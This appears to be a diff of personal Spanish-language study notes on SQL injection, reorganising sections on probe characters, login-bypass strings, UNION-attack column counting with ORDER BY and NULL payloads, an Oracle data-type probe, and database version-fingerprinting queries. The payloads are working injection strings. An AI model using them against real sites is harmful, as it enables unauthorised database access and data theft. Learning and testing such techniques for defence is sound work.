@@ -1,10 +1,12 @@
--FLAGS-
+-F.L.A.G.S-
 
 ###> IDENTIFICAR LA VULNERABILIDAD
 
 ' | simbolo comun para testear si existe el SQLi o no.
 
 " | simbolo comun para testear si existe el SQLi o no.
+
+' -- | simbolo comun para testear si existe el SQLi o no
 
 ###> BYPASS COMUNES
 
@@ -16,17 +18,6 @@ es siempre TRUE.
 
 USER-- | cuando se tiene un usuario se podria probar la vulnerabilidad tratando de ver si hace bypass sin ingresar la contrasena.
 
-###> IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS
-  (para recolectar informacion de la base de datos, debe estar presente el SQLi donde muestre en respuesta (pantalla) data. debe ir despues
-de la opcion UNION)
-
-ex: ' UNION SELECT @@version
-
-Microsoft : SELECT @@version
-MySQL : SELECT @@version
-Oracle : SELECT * FROM v$version
-PostgreSQL : SELECT version()
-
 ###> UNION ATTACK
 
 [necesario saber antes de]
@@ -35,11 +26,24 @@ PostgreSQL : SELECT version()
 
 _COMO SABER EL NUMERO DE COLUMNAS ?
 
-metodo1: ' UNION SELECT NULL--
-este metodo es similar al pasado, se trata de inyectar el payload de ejemplo con un consecutivo pero en este caso lo que trata es de validar si hay columna o no con un NULL request. con el primer NULL definiria si existe una columna, para seguir el consecutivo solamente debe de agregar [,] y se agregan la cantidad de NULL requests hasta mostrar el error, o no mostrar nada. tambien podria ser un resultado esperado para este tipo de consultas.
+metodo_1: ' ORDER BY 1--
+metodo_2: ' UNION SELECT NULL--
+https://github.com/b0ydcBug/webside/blob/main/sql_injection/notas.txt
 
-metodo2: ' ORDER BY 1--
-este metodo funciona inyectando una serie de flags [' ORDER BY 1--] con un consecutivo de manera que el numero incremental va a definir la cantidad de columnas una vez se obtenga un error en la consulta, o bien ningun resultado. el ultimo numero consecutivo define la cantidad de columnas. las columnas pueden ser manejadas por medio del index number, no hace falta saber el nombre de la columna ya que lo que se necesita es saber la
-cantidad de columnas.
+_COMO SABER EL DATA TYPE DE UNA COLUMNA ?
+[es posible saber esto inspeccionando el site como tal]
+
+ORACLE: ' UNION SELECT 'a','a' from DUAL--
+https://docs.oracle.com/database/121/SQLRF/statements_10002.htm
+
+###> IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS
+(para recolectar informacion de la base de datos, debe estar presente el SQLi UNION Attack donde muestre en respuesta (pantalla) la data)
+
+ex: ' UNION SELECT @@version
+
+Microsoft >> SELECT @@version
+MySQL >> SELECT @@version
+Oracle >> SELECT * FROM v$version
+PostgreSQL >> SELECT version()
 
 
